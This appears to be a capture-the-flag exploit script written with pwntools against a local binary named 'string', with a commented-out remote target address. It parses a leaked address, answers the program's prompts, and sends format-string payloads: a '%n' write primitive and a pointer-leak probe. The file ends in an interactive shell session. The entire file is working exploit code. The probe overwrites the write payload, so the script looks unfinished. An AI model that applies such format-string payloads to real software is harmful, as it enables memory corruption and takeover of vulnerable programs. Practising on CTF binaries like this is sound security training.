from pwn import *

context(arch="amd64", os="linux", log_level="DEBUG")

# p = remote("111.198.29.45", 52042)
p = process("./string")
# gdb.attach(p)

p.recvuntil("secret[0] is ")

addr = p.recv(7)

addrnum = int(addr, 16)
print("%#x"%addrnum)

p.sendline("liu")
p.sendline("east")
p.sendline("1")
p.sendline(str(addrnum))
payload = "%085x%7$n"
payload = "%#p." * 10
print("payload: %s"%payload)
p.sendline(payload)
p.interactive()